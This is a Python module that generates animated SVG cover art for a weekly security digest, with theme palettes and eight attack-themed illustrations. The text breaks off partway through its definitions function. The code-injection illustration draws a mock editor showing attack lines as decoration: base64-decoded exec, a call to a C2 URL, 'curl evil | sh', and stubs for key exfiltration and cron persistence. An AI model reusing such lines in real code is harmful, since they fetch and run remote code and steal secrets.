"""L20 Hero+2-Card SVG generator (1200x630 weekly digest cover).

Reference style: ``assets/images/2026-04-08-Tech_Security_Weekly_Digest_AI_CVE_Docker_Botnet.svg``.

Layout:
  - Top header bar (y=0..56): "WEEKLY DIGEST" left + date right + animated red separator.
  - HERO LEFT panel (32, 80, 600x510): story #1 with embedded visualization + action tag.
  - TOP RIGHT panel (652, 80, 516x248): story #2 with hub-spoke visualization + KPI card.
  - BOTTOM RIGHT panel (652, 344, 516x246): story #3 with visualization + KPI card.
  - QR code (1080, 504): real QR via ``svg_l22_generator.qr_block``.

Public API:
  - ``THEMES``: 5-theme palette (red, blue, amber, green, purple).
  - ``render_l20_hero(date_str, hero, top_right, bottom_right, url, post_title)``.

The 8 visual builders (``vb_*``) each return a ``<g transform="translate(cx,cy)">``
SVG string and are theme-aware via the THEMES palette.
"""
from __future__ import annotations

from typing import Dict

from scripts.lib import svg_l22_generator as l22


# --- Theme palette ---
THEMES: Dict[str, Dict[str, str]] = {
    "red": {
        "accent": "#E63946",
        "accent_soft": "#F87171",
        "accent_text": "#FBB6BD",
        "kpi_bg": "#1E0A0A",
        "panel_grad_a": "#1A0A08",
        "panel_grad_b": "#110608",
        "label_color": "#F87171",
        "halo_id": "hotRed",
    },
    "blue": {
        "accent": "#3A86FF",
        "accent_soft": "#60A5FA",
        "accent_text": "#BFC9D9",
        "kpi_bg": "#071426",
        "panel_grad_a": "#0A1A30",
        "panel_grad_b": "#071426",
        "label_color": "#7DA3D9",
        "halo_id": "hotBlue",
    },
    "amber": {
        "accent": "#FFB703",
        "accent_soft": "#FFD58A",
        "accent_text": "#FFD58A",
        "kpi_bg": "#1A1208",
        "panel_grad_a": "#1A1208",
        "panel_grad_b": "#120E06",
        "label_color": "#FFB703",
        "halo_id": "hotAmber",
    },
    "green": {
        "accent": "#4ADE80",
        "accent_soft": "#86EFAC",
        "accent_text": "#A7F3D0",
        "kpi_bg": "#062012",
        "panel_grad_a": "#062012",
        "panel_grad_b": "#04150B",
        "label_color": "#4ADE80",
        "halo_id": "hotGreen",
    },
    "purple": {
        "accent": "#A78BFA",
        "accent_soft": "#C4B5FD",
        "accent_text": "#DDD6FE",
        "kpi_bg": "#160629",
        "panel_grad_a": "#1B0E36",
        "panel_grad_b": "#10081E",
        "label_color": "#C4B5FD",
        "halo_id": "hotPurple",
    },
}


# --- Helpers ---
def _escape(text: str) -> str:
    """Minimal XML escape for user-provided strings."""
    if text is None:
        return ""
    return (
        str(text)
        .replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace(">", "&gt;")
        .replace('"', "&quot;")
    )


def _theme(name: str) -> Dict[str, str]:
    return THEMES.get(name, THEMES["red"])


# --- Visual block builders (each returns a <g transform="translate(cx,cy)"> group) ---
def vb_cve_chain(cx: int, cy: int, theme: str = "red") -> str:
    """CVE regression chain: prior CVE -> incomplete fix -> new CVE."""
    t = _theme(theme)
    a, soft, txt = t["accent"], t["accent_soft"], t["accent_text"]
    return (
        f'<g transform="translate({cx},{cy})" filter="url(#softShadow)">'
        f'<rect x="-160" y="-110" width="320" height="220" rx="10" fill="#0A0C16" stroke="{a}" stroke-width="1.4" opacity="0.95"/>'
        f'<text x="0" y="-86" text-anchor="middle" font-family="Inter, Helvetica, Arial, sans-serif" font-size="11" font-weight="700" fill="{soft}" letter-spacing="2">CVE REGRESSION CHAIN</text>'
        f'<g transform="translate(-140,-70)">'
        f'<rect x="0" y="0" width="280" height="50" rx="6" fill="#1E0A14" stroke="{soft}" stroke-width="1.2"/>'
        f'<text x="10" y="18" font-family="Inter, monospace" font-size="11" font-weight="800" fill="{soft}">PRIOR CVE</text>'
        f'<text x="10" y="33" font-family="Inter, monospace" font-size="9" font-weight="600" fill="{txt}">Original flaw  /  patched</text>'
        f'<text x="10" y="44" font-family="Inter, monospace" font-size="8" font-weight="500" fill="{txt}" opacity="0.8">Partial fix earlier</text>'
        f'<rect x="226" y="6" width="48" height="14" rx="3" fill="#7A0000" stroke="{a}" stroke-width="1">'
        f'<animate attributeName="opacity" values="0.7;1;0.7" dur="1.6s" repeatCount="indefinite"/></rect>'
        f'<text x="250" y="16" text-anchor="middle" font-family="Inter, monospace" font-size="8" font-weight="900" fill="#FFE4E6">PATCHED</text>'
        f'</g>'
        f'<g transform="translate(-12,-12)">'
        f'<path d="M0 0 L0 22 L-6 14 M0 22 L6 14" stroke="{a}" stroke-width="1.8" fill="none" stroke-linecap="round"/>'
        f'<text x="14" y="14" font-family="Inter, monospace" font-size="9" font-weight="700" fill="{soft}">REGRESSED</text>'
        f'</g>'
        f'<g transform="translate(-140,16)">'
        f'<rect x="0" y="0" width="280" height="50" rx="6" fill="#2A0808" stroke="{a}" stroke-width="2">'
        f'<animate attributeName="stroke-opacity" values="0.6;1;0.6" dur="1.8s" repeatCount="indefinite"/></rect>'
        f'<text x="10" y="18" font-family="Inter, monospace" font-size="11" font-weight="800" fill="#F5F7FA">NEW CVE</text>'
        f'<text x="10" y="33" font-family="Inter, monospace" font-size="9" font-weight="600" fill="#FFB703">Active exploitation</text>'
        f'<text x="10" y="44" font-family="Inter, monospace" font-size="8" font-weight="500" fill="#E0C0A0" opacity="0.8">Production hosts at risk</text>'
        f'<rect x="232" y="6" width="42" height="14" rx="3" fill="{a}">'
        f'<animate attributeName="opacity" values="0.8;1;0.8" dur="1.2s" repeatCount="indefinite"/></rect>'
        f'<text x="253" y="16" text-anchor="middle" font-family="Inter, monospace" font-size="8" font-weight="900" fill="#FFFFFF">ACTIVE</text>'
        f'</g>'
        f'<g transform="translate(-140,80)">'
        f'<rect x="0" y="0" width="280" height="22" rx="4" fill="#0E1220" stroke="#3A86FF" stroke-width="1"/>'
        f'<text x="140" y="15" text-anchor="middle" font-family="Inter, monospace" font-size="9" font-weight="700" fill="#8FB8FF">PATCH UPSTREAM NOW</text>'
        f'</g>'
        f'</g>'
    )


def vb_hub_spoke(cx: int, cy: int, theme: str = "blue", center_label: str = "C2") -> str:
    """Hub-spoke C2 / botnet: center node with 6 spokes."""
    t = _theme(theme)
    a, soft = t["accent"], t["accent_soft"]
    cl = _escape(center_label)[:12]
    return (
        f'<g transform="translate({cx},{cy})">'
        f'<circle cx="0" cy="0" r="30" fill="#0A1540" stroke="{a}" stroke-width="2" filter="url(#softShadow)">'
        f'<animate attributeName="r" values="28;34;28" dur="3.2s" repeatCount="indefinite"/></circle>'
        f'<text x="0" y="2" text-anchor="middle" font-family="Inter, monospace" font-size="11" font-weight="900" fill="{soft}">{cl}</text>'
        f'<text x="0" y="16" text-anchor="middle" font-family="Inter, monospace" font-size="8" font-weight="700" fill="{a}">HUB</text>'
        f'<g stroke="{a}" stroke-width="1" stroke-dasharray="3 2" fill="none" opacity="0.6">'
        f'<line x1="0" y1="0" x2="90" y2="-55"/><line x1="0" y1="0" x2="108" y2="0"/>'
        f'<line x1="0" y1="0" x2="90" y2="55"/><line x1="0" y1="0" x2="-90" y2="55"/>'
        f'<line x1="0" y1="0" x2="-108" y2="0"/><line x1="0" y1="0" x2="-90" y2="-55"/>'
        f'</g>'
        f'<g font-family="Inter, monospace" font-size="7" font-weight="800">'
        f'<g transform="translate(92,-58)"><rect x="-24" y="-12" width="48" height="24" rx="4" fill="#0A2040" stroke="{a}" stroke-width="1.2"/><text x="0" y="2" text-anchor="middle" fill="{soft}">EDGE-1</text>'
        f'<circle cx="20" cy="-8" r="4" fill="#E63946"><animate attributeName="opacity" values="0.4;1;0.4" dur="1.6s" repeatCount="indefinite"/></circle></g>'
        f'<g transform="translate(112,0)"><rect x="-24" y="-12" width="48" height="24" rx="4" fill="#0A2040" stroke="{a}" stroke-width="1.2"/><text x="0" y="2" text-anchor="middle" fill="{soft}">EDGE-2</text>'
        f'<circle cx="20" cy="-8" r="4" fill="#E63946"><animate attributeName="opacity" values="0.4;1;0.4" dur="2s" begin="0.3s" repeatCount="indefinite"/></circle></g>'
        f'<g transform="translate(92,58)"><rect x="-24" y="-12" width="48" height="24" rx="4" fill="#0A2040" stroke="#FFB703" stroke-width="1.2"/><text x="0" y="2" text-anchor="middle" fill="#FFD58A">RELAY</text></g>'
        f'<g transform="translate(-92,58)"><rect x="-24" y="-12" width="48" height="24" rx="4" fill="#0A2040" stroke="#FFB703" stroke-width="1.2"/><text x="0" y="2" text-anchor="middle" fill="#FFD58A">PROXY</text></g>'
        f'<g transform="translate(-112,0)"><rect x="-24" y="-12" width="48" height="24" rx="4" fill="#0A2040" stroke="#4ADE80" stroke-width="1.2"/><text x="0" y="2" text-anchor="middle" fill="#4ADE80">VICTIM</text></g>'
        f'<g transform="translate(-92,-58)"><rect x="-24" y="-12" width="48" height="24" rx="4" fill="#0A2040" stroke="#4ADE80" stroke-width="1.2"/><text x="0" y="2" text-anchor="middle" fill="#4ADE80">CREDS</text></g>'
        f'</g>'
        f'<g fill="{soft}">'
        f'<circle r="2.2"><animateMotion path="M0 0 L90 -55" dur="2s" repeatCount="indefinite"/></circle>'
        f'<circle r="2.2"><animateMotion path="M0 0 L108 0" dur="1.8s" begin="0.3s" repeatCount="indefinite"/></circle>'
        f'<circle r="2.2"><animateMotion path="M0 0 L90 55" dur="2.2s" begin="0.6s" repeatCount="indefinite"/></circle>'
        f'<circle r="2.2"><animateMotion path="M0 0 L-90 55" dur="2.4s" begin="0.9s" repeatCount="indefinite"/></circle>'
        f'<circle r="2.2"><animateMotion path="M0 0 L-108 0" dur="1.9s" begin="1.2s" repeatCount="indefinite"/></circle>'
        f'<circle r="2.2"><animateMotion path="M0 0 L-90 -55" dur="2.1s" begin="1.5s" repeatCount="indefinite"/></circle>'
        f'</g>'
        f'</g>'
    )


def vb_container_escape(cx: int, cy: int, theme: str = "red") -> str:
    """Container -> host escape with broken layers and bypass badge."""
    t = _theme(theme)
    a, soft = t["accent"], t["accent_soft"]
    return (
        f'<g transform="translate({cx},{cy})">'
        f'<g filter="url(#softShadow)">'
        f'<rect x="-95" y="-110" width="190" height="100" rx="10" fill="#0A1B2E" stroke="#2CCCE4" stroke-width="2"/>'
        f'<g transform="translate(-81,-96)" font-family="Inter, monospace" font-size="9" font-weight="800" fill="#0A1020">'
        f'<rect x="0" y="48" width="162" height="22" rx="3" fill="#2CCCE4" opacity="0.9"/>'
        f'<rect x="0" y="24" width="162" height="20" rx="3" fill="#2CCCE4" opacity="0.72"/>'
        f'<rect x="0" y="0" width="162" height="20" rx="3" fill="#2CCCE4" opacity="0.55"/>'
        f'<text x="81" y="62" text-anchor="middle">APP LAYER</text>'
        f'<text x="81" y="37" text-anchor="middle">RUNTIME</text>'
        f'<text x="81" y="13" text-anchor="middle">CONTAINER</text>'
        f'</g>'
        f'<text x="0" y="-22" text-anchor="middle" font-family="Inter, monospace" font-size="10" font-weight="700" fill="#2CCCE4">container API</text>'
        f'</g>'
        f'<g transform="translate(-65,-126)" filter="url(#softShadow)">'
        f'<rect x="0" y="0" width="130" height="16" rx="3" fill="{a}">'
        f'<animate attributeName="opacity" values="0.85;1;0.85" dur="1.5s" repeatCount="indefinite"/></rect>'
        f'<text x="65" y="11" text-anchor="middle" font-family="Inter, monospace" font-size="9" font-weight="900" fill="#FFFFFF">BYPASS AUTHZ</text>'
        f'</g>'
        f'<g transform="translate(0,-4)">'
        f'<path d="M0 0 L0 44" stroke="{a}" stroke-width="2.4" stroke-dasharray="4 3" fill="none">'
        f'<animate attributeName="stroke-dashoffset" values="0;-14" dur="1.2s" repeatCount="indefinite"/></path>'
        f'<g fill="{soft}">'
        f'<circle r="3.2"><animateMotion path="M0 -4 L0 46" dur="2.2s" repeatCount="indefinite"/></circle>'
        f'<circle r="2.4" opacity="0.7"><animateMotion path="M0 -4 L0 46" dur="2.2s" begin="0.7s" repeatCount="indefinite"/></circle>'
        f'</g>'
        f'</g>'
        f'<circle cx="0" cy="40" r="22" fill="{a}" opacity="0.35">'
        f'<animate attributeName="r" values="16;28;16" dur="2s" repeatCount="indefinite"/>'
        f'<animate attributeName="opacity" values="0.6;0.2;0.6" dur="2s" repeatCount="indefinite"/></circle>'
        f'<g transform="translate(-95,50)" filter="url(#softShadow)">'
        f'<rect x="0" y="0" width="190" height="80" rx="10" fill="#1E0A0A" stroke="{a}" stroke-width="2.2"/>'
        f'<path d="M62 0 L74 18 L86 0" stroke="{a}" stroke-width="2" fill="none" stroke-linecap="round">'
        f'<animate attributeName="opacity" values="0.5;1;0.5" dur="1.4s" repeatCount="indefinite"/></path>'
        f'<text x="95" y="32" text-anchor="middle" font-family="Inter, monospace" font-size="14" font-weight="900" fill="{soft}">HOST KERNEL</text>'
        f'<text x="95" y="50" text-anchor="middle" font-family="Inter, monospace" font-size="10" font-weight="700" fill="#FCA5A5">root access achieved</text>'
        f'<g transform="translate(56,58)" font-family="Inter, monospace" font-size="9" font-weight="900" fill="#FFF5F5">'
        f'<rect x="0" y="0" width="78" height="18" rx="3" fill="#7A0000" stroke="{a}" stroke-width="1.2"/>'
        f'<text x="39" y="13" text-anchor="middle">uid=0  PWNED</text>'
        f'</g>'
        f'</g>'
        f'</g>'
    )


def vb_ai_agent_funnel(cx: int, cy: int, theme: str = "amber") -> str:
    """AI agent hub funneling shadow-app boxes + sub-card with bar gauge."""
    t = _theme(theme)
    a, soft = t["accent"], t["accent_soft"]
    return (
        f'<g transform="translate({cx},{cy})">'
        f'<circle cx="-110" cy="0" r="30" fill="#1A1208" stroke="{a}" stroke-width="1.8" filter="url(#softShadow)">'
        f'<animate attributeName="opacity" values="0.85;1;0.85" dur="3s" repeatCount="indefinite"/></circle>'
        f'<text x="-110" y="-4" text-anchor="middle" font-family="Inter, monospace" font-size="11" font-weight="900" fill="{soft}">AI</text>'
        f'<text x="-110" y="10" text-anchor="middle" font-family="Inter, monospace" font-size="8" font-weight="700" fill="{a}">AGENT</text>'
        f'<circle cx="-110" cy="0" r="38" fill="none" stroke="{a}" stroke-width="1">'
        f'<animate attributeName="r" values="32;46;32" dur="2.2s" repeatCount="indefinite"/>'
        f'<animate attributeName="opacity" values="0.8;0;0.8" dur="2.2s" repeatCount="indefinite"/></circle>'
        f'<g transform="translate(-50,-32)" font-family="Inter, monospace" font-size="8" font-weight="700">'
        f'<rect x="0" y="0" width="68" height="20" rx="3" fill="#1A1208" stroke="{a}" stroke-width="1"/>'
        f'<text x="34" y="14" text-anchor="middle" fill="{soft}">DARK APP</text>'
        f'<rect x="0" y="26" width="68" height="20" rx="3" fill="#1A1208" stroke="{a}" stroke-width="1" opacity="0.85"/>'
        f'<text x="34" y="40" text-anchor="middle" fill="{soft}">SHADOW ID</text>'
        f'<rect x="0" y="52" width="68" height="20" rx="3" fill="#1A1208" stroke="{a}" stroke-width="1" opacity="0.7"/>'
        f'<text x="34" y="66" text-anchor="middle" fill="{soft}">UNMANAGED</text>'
        f'<line x1="-50" y1="0" x2="0" y2="10" stroke="{a}" stroke-width="0.8" stroke-dasharray="2 2" opacity="0.6"/>'
        f'<line x1="-50" y1="0" x2="0" y2="36" stroke="{a}" stroke-width="0.8" stroke-dasharray="2 2" opacity="0.5"/>'
        f'<line x1="-50" y1="0" x2="0" y2="62" stroke="{a}" stroke-width="0.8" stroke-dasharray="2 2" opacity="0.4"/>'
        f'</g>'
        f'<g transform="translate(60,-40)" filter="url(#softShadow)">'
        f'<rect x="0" y="0" width="140" height="90" rx="6" fill="#0A0C16" stroke="#E63946" stroke-width="1.4"/>'
        f'<text x="70" y="18" text-anchor="middle" font-family="Inter, monospace" font-size="9" font-weight="800" fill="#F87171">EXPOSED FLEET</text>'
        f'<text x="70" y="32" text-anchor="middle" font-family="Inter, monospace" font-size="8" font-weight="600" fill="#FCA5A5">scaled abuse surface</text>'
        f'<g transform="translate(8,42)" fill="{a}">'
        f'<rect x="0" y="0" width="14" height="10" rx="2"/>'
        f'<rect x="18" y="0" width="14" height="10" rx="2" opacity="0.85"/>'
        f'<rect x="36" y="0" width="14" height="10" rx="2" opacity="0.7"/>'
        f'<rect x="54" y="0" width="14" height="10" rx="2" opacity="0.55"/>'
        f'<rect x="72" y="0" width="14" height="10" rx="2" opacity="0.4">'
        f'<animate attributeName="opacity" values="0.2;0.6;0.2" dur="1.4s" repeatCount="indefinite"/></rect>'
        f'<rect x="90" y="0" width="14" height="10" rx="2" opacity="0.25">'
        f'<animate attributeName="opacity" values="0.1;0.5;0.1" dur="1.8s" begin="0.3s" repeatCount="indefinite"/></rect>'
        f'<rect x="108" y="0" width="14" height="10" rx="2" opacity="0.2">'
        f'<animate attributeName="opacity" values="0.1;0.4;0.1" dur="2s" begin="0.5s" repeatCount="indefinite"/></rect>'
        f'</g>'
        f'<text x="70" y="74" text-anchor="middle" font-family="Inter, monospace" font-size="8" font-weight="700" fill="{a}">automated abuse vector</text>'
        f'</g>'
        f'</g>'
    )


def vb_ransomware_lock(cx: int, cy: int, theme: str = "red") -> str:
    """Big lock + ransom note panel + countdown."""
    t = _theme(theme)
    a, soft = t["accent"], t["accent_soft"]
    return (
        f'<g transform="translate({cx},{cy})">'
        f'<g transform="translate(-100,-90)" filter="url(#softShadow)">'
        f'<rect x="0" y="32" width="80" height="64" rx="8" fill="{a}"/>'
        f'<path d="M14 32 L14 16 Q40 -6 66 16 L66 32" stroke="{a}" stroke-width="6" fill="none" stroke-linecap="round"/>'
        f'<circle cx="40" cy="60" r="6" fill="#FFFFFF"/>'
        f'<rect x="38" y="62" width="4" height="14" fill="#FFFFFF"/>'
        f'<text x="40" y="116" text-anchor="middle" font-family="Inter, monospace" font-size="10" font-weight="900" fill="{soft}">LOCKED</text>'
        f'</g>'
        f'<g transform="translate(20,-90)" filter="url(#softShadow)">'
        f'<rect x="0" y="0" width="180" height="180" rx="8" fill="#0A0C16" stroke="{a}" stroke-width="1.4"/>'
        f'<text x="90" y="22" text-anchor="middle" font-family="Inter, monospace" font-size="11" font-weight="900" fill="#F87171">RANSOM NOTE</text>'
        f'<line x1="14" y1="32" x2="166" y2="32" stroke="{a}" stroke-width="0.8" opacity="0.6"/>'
        f'<g font-family="Inter, monospace" font-size="9" font-weight="600" fill="#FCA5A5">'
        f'<text x="14" y="50">Files encrypted: 100%</text>'
        f'<text x="14" y="68">AES-256 + RSA-4096</text>'
        f'<text x="14" y="86">Backups deleted</text>'
        f'<text x="14" y="104">Volume shadow wiped</text>'
        f'</g>'
        f'<rect x="14" y="118" width="152" height="22" rx="3" fill="#2A0808" stroke="{a}" stroke-width="1.2">'
        f'<animate attributeName="stroke-opacity" values="0.6;1;0.6" dur="1.6s" repeatCount="indefinite"/></rect>'
        f'<text x="90" y="133" text-anchor="middle" font-family="Inter, monospace" font-size="10" font-weight="900" fill="#FFFFFF">PAY OR LOSE DATA</text>'
        f'<g transform="translate(14,148)" font-family="Inter, monospace" font-size="8" font-weight="700" fill="#FFB703">'
        f'<rect x="0" y="0" width="152" height="20" rx="3" fill="#1A1208" stroke="#FFB703" stroke-width="1"/>'
        f'<text x="76" y="14" text-anchor="middle">countdown  /  72h window</text>'
        f'</g>'
        f'</g>'
        f'</g>'
    )


def vb_supply_chain_pipe(cx: int, cy: int, theme: str = "amber") -> str:
    """Supply chain pipeline source -> CI -> registry -> deploy with poisoned stage."""
    t = _theme(theme)
    a, soft = t["accent"], t["accent_soft"]
    return (
        f'<g transform="translate({cx},{cy})" font-family="Inter, monospace" font-weight="800">'
        f'<g transform="translate(-200,-30)">'
        f'<rect x="0" y="0" width="80" height="60" rx="6" fill="#0A1628" stroke="#3A86FF" stroke-width="1.4"/>'
        f'<text x="40" y="22" text-anchor="middle" font-size="10" fill="#8FB8FF">SOURCE</text>'
        f'<text x="40" y="40" text-anchor="middle" font-size="8" font-weight="600" fill="#BFC9D9">git repo</text>'
        f'<text x="40" y="52" text-anchor="middle" font-size="8" font-weight="600" fill="#BFC9D9">commits</text>'
        f'</g>'
        f'<g transform="translate(-100,-30)">'
        f'<rect x="0" y="0" width="80" height="60" rx="6" fill="#1E1805" stroke="{a}" stroke-width="2">'
        f'<animate attributeName="stroke-opacity" values="0.6;1;0.6" dur="1.8s" repeatCount="indefinite"/></rect>'
        f'<text x="40" y="22" text-anchor="middle" font-size="10" fill="{soft}">CI / BUILD</text>'
        f'<text x="40" y="40" text-anchor="middle" font-size="8" font-weight="600" fill="{a}">poisoned step</text>'
        f'<circle cx="68" cy="12" r="5" fill="#E63946"><animate attributeName="opacity" values="0.4;1;0.4" dur="1.2s" repeatCount="indefinite"/></circle>'
        f'</g>'
        f'<g transform="translate(0,-30)">'
        f'<rect x="0" y="0" width="80" height="60" rx="6" fill="#0A1B2E" stroke="#2CCCE4" stroke-width="1.4"/>'
        f'<text x="40" y="22" text-anchor="middle" font-size="10" fill="#2CCCE4">REGISTRY</text>'
        f'<text x="40" y="40" text-anchor="middle" font-size="8" font-weight="600" fill="#7ED4E5">images</text>'
        f'<text x="40" y="52" text-anchor="middle" font-size="8" font-weight="600" fill="#7ED4E5">artifacts</text>'
        f'</g>'
        f'<g transform="translate(100,-30)">'
        f'<rect x="0" y="0" width="80" height="60" rx="6" fill="#062012" stroke="#4ADE80" stroke-width="1.4"/>'
        f'<text x="40" y="22" text-anchor="middle" font-size="10" fill="#4ADE80">DEPLOY</text>'
        f'<text x="40" y="40" text-anchor="middle" font-size="8" font-weight="600" fill="#86EFAC">prod cluster</text>'
        f'<text x="40" y="52" text-anchor="middle" font-size="8" font-weight="600" fill="#86EFAC">tainted</text>'
        f'</g>'
        f'<g stroke="{a}" stroke-width="2" fill="none" stroke-linecap="round">'
        f'<path d="M-120 0 L-100 0" stroke-dasharray="3 2"><animate attributeName="stroke-dashoffset" values="0;-10" dur="1s" repeatCount="indefinite"/></path>'
        f'<path d="M-20 0 L0 0" stroke-dasharray="3 2"><animate attributeName="stroke-dashoffset" values="0;-10" dur="1s" repeatCount="indefinite"/></path>'
        f'<path d="M80 0 L100 0" stroke-dasharray="3 2"><animate attributeName="stroke-dashoffset" values="0;-10" dur="1s" repeatCount="indefinite"/></path>'
        f'</g>'
        f'<g fill="{soft}">'
        f'<circle r="2.4"><animateMotion path="M-120 0 L100 0" dur="3.6s" repeatCount="indefinite"/></circle>'
        f'<circle r="2" opacity="0.7"><animateMotion path="M-120 0 L100 0" dur="3.6s" begin="1.2s" repeatCount="indefinite"/></circle>'
        f'</g>'
        f'<text x="0" y="56" text-anchor="middle" font-family="Inter, Helvetica, Arial, sans-serif" font-size="10" font-weight="700" fill="{a}" letter-spacing="2">SUPPLY-CHAIN POISON</text>'
        f'</g>'
    )


def vb_code_injection(cx: int, cy: int, theme: str = "red") -> str:
    """Mock code editor pane with highlighted injection line + RCE badge."""
    t = _theme(theme)
    a, soft = t["accent"], t["accent_soft"]
    return (
        f'<g transform="translate({cx},{cy})" filter="url(#softShadow)">'
        f'<rect x="-150" y="-90" width="300" height="180" rx="8" fill="#0A0C16" stroke="{a}" stroke-width="1.4"/>'
        f'<rect x="-150" y="-90" width="300" height="22" rx="8" fill="#1A1820"/>'
        f'<g transform="translate(-138,-79)"><circle cx="0" cy="0" r="3" fill="#E63946"/><circle cx="10" cy="0" r="3" fill="#FFB703"/><circle cx="20" cy="0" r="3" fill="#4ADE80"/></g>'
        f'<text x="0" y="-74" text-anchor="middle" font-family="Inter, monospace" font-size="9" font-weight="700" fill="#BFC9D9">payload.py  /  injected</text>'
        f'<g font-family="Inter, monospace" font-size="9" font-weight="600">'
        f'<text x="-138" y="-50" fill="#7DA3D9">  1  import os, base64</text>'
        f'<text x="-138" y="-34" fill="#7DA3D9">  2  from urllib import request</text>'
        f'<text x="-138" y="-18" fill="#7DA3D9">  3</text>'
        f'<rect x="-148" y="-12" width="296" height="18" fill="{a}" opacity="0.22"/>'
        f'<text x="-138" y="0" fill="{soft}">  4  exec(base64.b64decode(PAYLOAD))</text>'
        f'<text x="-138" y="16" fill="#7DA3D9">  5  request.urlopen(C2_URL)</text>'
        f'<text x="-138" y="32" fill="#7DA3D9">  6  os.system("curl evil | sh")</text>'
        f'<text x="-138" y="48" fill="#7DA3D9">  7  # exfil_keys()</text>'
        f'<text x="-138" y="64" fill="#7DA3D9">  8  # persist_cron()</text>'
        f'</g>'
        f'<g transform="translate(118,0)">'
        f'<circle cx="0" cy="0" r="14" fill="{a}" opacity="0.7">'
        f'<animate attributeName="r" values="10;16;10" dur="1.4s" repeatCount="indefinite"/></circle>'
        f'<text x="0" y="3" text-anchor="middle" font-family="Inter, monospace" font-size="9" font-weight="900" fill="#FFFFFF">RCE</text>'
        f'</g>'
        f'<g fill="{soft}">'
        f'<circle r="2"><animateMotion path="M120 0 L150 -40" dur="1.6s" repeatCount="indefinite"/></circle>'
        f'<circle r="2" opacity="0.7"><animateMotion path="M120 0 L150 -40" dur="1.6s" begin="0.5s" repeatCount="indefinite"/></circle>'
        f'</g>'
        f'</g>'
    )


def vb_data_exfil(cx: int, cy: int, theme: str = "blue") -> str:
    """Database -> packets -> external attacker."""
    t = _theme(theme)
    a, soft = t["accent"], t["accent_soft"]
    return (
        f'<g transform="translate({cx},{cy})">'
        f'<g transform="translate(-160,-50)" filter="url(#softShadow)">'
        f'<ellipse cx="40" cy="6" rx="40" ry="8" fill="#0A1B2E" stroke="#2CCCE4" stroke-width="1.6"/>'
        f'<rect x="0" y="6" width="80" height="56" fill="#0A1B2E" stroke="#2CCCE4" stroke-width="1.6"/>'
        f'<ellipse cx="40" cy="62" rx="40" ry="8" fill="#0A1B2E" stroke="#2CCCE4" stroke-width="1.6"/>'
        f'<ellipse cx="40" cy="22" rx="40" ry="6" fill="none" stroke="#2CCCE4" stroke-width="0.8" opacity="0.6"/>'
        f'<ellipse cx="40" cy="40" rx="40" ry="6" fill="none" stroke="#2CCCE4" stroke-width="0.8" opacity="0.6"/>'
        f'<text x="40" y="84" text-anchor="middle" font-family="Inter, monospace" font-size="10" font-weight="800" fill="#2CCCE4">DB / S3</text>'
        f'<text x="40" y="98" text-anchor="middle" font-family="Inter, monospace" font-size="8" font-weight="600" fill="#7ED4E5">PII  /  secrets</text>'
        f'</g>'
        f'<g transform="translate(80,-50)" filter="url(#softShadow)">'
        f'<rect x="0" y="0" width="80" height="80" rx="8" fill="#1E0A0A" stroke="{a}" stroke-width="2"/>'
        f'<text x="40" y="22" text-anchor="middle" font-family="Inter, monospace" font-size="10" font-weight="900" fill="{soft}">ATTACKER</text>'
        f'<g transform="translate(20,32)" stroke="{soft}" stroke-width="1.6" fill="none">'
        f'<circle cx="20" cy="10" r="8"/>'
        f'<path d="M6 32 Q20 22 34 32"/>'
        f'</g>'
        f'<text x="40" y="74" text-anchor="middle" font-family="Inter, monospace" font-size="8" font-weight="700" fill="#FCA5A5">offshore relay</text>'
        f'</g>'
        f'<g stroke="{a}" stroke-width="1.4" stroke-dasharray="4 3" fill="none">'
        f'<path d="M-80 -10 L80 -10"><animate attributeName="stroke-dashoffset" values="0;-14" dur="1.2s" repeatCount="indefinite"/></path>'
        f'<path d="M-80 0 L80 0"><animate attributeName="stroke-dashoffset" values="0;-14" dur="1.4s" begin="0.2s" repeatCount="indefinite"/></path>'
        f'<path d="M-80 10 L80 10"><animate attributeName="stroke-dashoffset" values="0;-14" dur="1s" begin="0.4s" repeatCount="indefinite"/></path>'
        f'</g>'
        f'<g fill="{soft}">'
        f'<circle r="2.4"><animateMotion path="M-80 -10 L80 -10" dur="2s" repeatCount="indefinite"/></circle>'
        f'<circle r="2.4"><animateMotion path="M-80 0 L80 0" dur="2.2s" begin="0.4s" repeatCount="indefinite"/></circle>'
        f'<circle r="2.4"><animateMotion path="M-80 10 L80 10" dur="2.4s" begin="0.8s" repeatCount="indefinite"/></circle>'
        f'</g>'
        f'<text x="0" y="40" text-anchor="middle" font-family="Inter, Helvetica, Arial, sans-serif" font-size="10" font-weight="700" fill="{a}" letter-spacing="2">DATA EXFILTRATION</text>'
        f'</g>'
    )


VISUAL_BUILDERS = {
    "cve_chain": vb_cve_chain,
    "hub_spoke": vb_hub_spoke,
    "container_escape": vb_container_escape,
    "ai_agent_funnel": vb_ai_agent_funnel,
    "ransomware_lock": vb_ransomware_lock,
    "supply_chain_pipe": vb_supply_chain_pipe,
    "code_injection": vb_code_injection,
    "data_exfil": vb_data_exfil,
}


def _render_visual(visual_id: str, cx: int, cy: int, theme: str, label: str = "") -> str:
    """Dispatch to the correct visual builder; falls back to cve_chain."""
    fn = VISUAL_BUILDERS.get(visual_id, vb_cve_chain)
    if visual_id == "hub_spoke" and label:
        return fn(cx, cy, theme=theme, center_label=label)
    return fn(cx, cy, theme=theme)


def _defs() -> str:
    """Reusable gradient/filter/pattern definitions."""
    return (
        '<defs>'
        '<linearGradient id="bgSpread" x1="0%" y1="0%" x2="100%" y2="100%">'
        '<stop offset="0%" stop-color="#0B1326"/>'
        '<stop offset="55%" stop-color="#0D1530"/>'
        '<stop offset="100%" stop-color="#141034"/>'
        '</linearGradient>'
        '<linearGradient id="heroPanel" x1="0%" y1="0%" x2="0%" y2="100%">'
        '<stop offset="0%" stop-color="#1A0A08"/><stop offset="100%" stop-color="#110608"/></linearGradient>'
        '<linearGradient id="heroPanelBlue" x1="0%" y1="0%" x2="0%" y2="100%">'
        '<stop offset="0%" stop-color="#0A1A30"/><stop offset="100%" stop-color="#071426"/></linearGradient>'
        '<linearGradient id="heroPanelAmber" x1="0%" y1="0%" x2="0%" y2="100%">'
        '<stop offset="0%" stop-color="#1A1208"/><stop offset="100%" stop-color="#120E06"/></linearGradient>'
        '<linearGradient id="heroPanelGreen" x1="0%" y1="0%" x2="0%" y2="100%">'
        '<stop offset="0%" stop-color="#062012"/><stop offset="100%" stop-color="#04150B"/></linearGradient>'
        '<linearGradient id="heroPanelPurple" x1="0%" y1="0%" x2="0%" y2="100%">'
        '<stop offset="0%" stop-color="#1B0E36"/><stop offset="100%" stop-color="#10081E"/></linearGradient>'
